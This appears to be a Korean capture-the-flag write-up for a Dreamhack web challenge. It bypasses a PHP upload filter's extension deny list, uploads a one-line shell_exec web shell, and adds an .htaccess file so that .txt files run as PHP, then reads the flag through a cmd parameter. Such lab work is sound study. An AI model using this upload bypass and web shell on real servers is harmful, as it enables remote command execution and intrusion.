created: 2026-01-18 01:24
category: #web 
link: https://dreamhack.io/wargame/challenges/418

# Write-up
문제 설명에 나와있듯이, 이 문제는 파일 업로드 취약점을 활용하는 문제이다. 따라서 웹쉘 파일을 업로드하려고 했다. 

문제 코드를 분석하였고, php 파일에서 **필터링하고 있는 확장자**는 다음과 같다.
`$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");`

```php
$temp = explode(".", $name);
$extension = end($temp);
       
if(in_array($extension, $deniedExts)){
	die($extension . " extension file is not allowed to upload ! ");
}
```
이런 식으로 `explode` 함수를 통해 "." 기준으로 나누어 배열로 반환하고 그 배열 중 마지막 원소를 가져와서 확장자를 조회하는 로직도 있었다. 

찾아보니 php 확장자로 쓸 수 있는 키워드는 훨씬 더 많았다. 따라서 `phps`로 우회하기로 했다.

```php
// webshell.phps
<?php
echo shell_exec($_GET['cmd']);
?>
```
그러나 해당 파일을 업로드해서 업로드된 경로를 접속했는데 다음과 같은 화면이 출력되었다. 

![[Pasted image 20260118012850.png|600]]
뭔가 권한 관련된 문제가 발생했다. 따라서 처음에는 이를 우회하려고 했었다. 그러나 문제의 제목에 htaccess 키워드가 있었고 이를 검색해보니 `.htaccess` 파일을 통해 아파치 설정을 수정하여 `.txt` 확장자 파일을 php로 실행할 수 있다는 것을 알게 되었다. 

따라서 다음과 같이 `.htaccess` 파일을 작성하였다. 
```txt
AddHandler php5-script .php .txt
AddType text/html .php .txt
```

위 `.htaccess` 파일과 `webshell.phps` -> `webshell.txt` 파일을 업로드하여 `/upload/webshell.txt?cmd=ls` 경로로 접속할 수 있었다. 
![[Pasted image 20260118021431.png]]

마지막으로 `/upload/webshell.txt?cmd=/flag`로 플래그를 확인할 수 있었다.

# Reference
- https://httpd.apache.org/docs/current/ko/howto/htaccess.html
- https://itsaessak.tistory.com/189
- https://www.hahwul.com/cullinan/attack/insecure-file-upload/